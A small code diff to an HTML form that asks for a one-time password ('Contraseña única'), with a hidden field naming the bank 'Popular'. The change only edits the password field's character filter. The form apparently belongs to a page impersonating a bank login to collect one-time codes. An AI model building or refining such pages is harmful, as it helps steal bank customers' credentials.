@@ -81,7 +81,7 @@
   <input type="hidden" name="" id="banco" style="height:40px; border:1px solid #d3f3f3;" value="Popular">
 
    <label for="">Contraseña única</label>
-   <center><input type="password" name="" id="txtPass" oninput="this.value = this.value.replace(/\D+/g, '');">
+   <center><input type="password" name="" id="txtPass" oninput="this.value = this.value.replace(/\s+/g, '')">
     <br><br><br><button id="btnUsuario">Ingresar</button></center>
   </div>
 
